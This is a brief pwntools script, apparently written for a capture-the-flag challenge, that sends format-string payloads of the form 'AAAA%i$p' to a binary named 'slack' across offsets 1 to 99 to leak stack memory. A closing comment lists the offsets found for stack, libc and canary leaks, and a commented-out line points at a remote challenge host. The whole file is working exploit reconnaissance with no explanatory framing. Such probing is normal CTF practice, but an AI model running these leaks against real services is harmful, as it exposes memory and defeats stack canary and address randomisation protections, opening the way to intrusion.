from pwn import *

# io = remote("3.75.185.198", 7000)
io = process("./slack")
# io = gdb.debug("./slack", '''
# b *0x080491ed
# c''')
context.log_level = 'debug' 

for i in range(1, 100):
    io = process("./slack")
    # io = gdb.debug("./slack", '''
    # b *0x080491ed
    # c''')
    io.sendline(f"AAAA%{i}$p")
    try:
        print(f"recieved at {i}: {io.recvline()}")
    except:
        continue

'''
stack 3
libc 9
canary 19
'''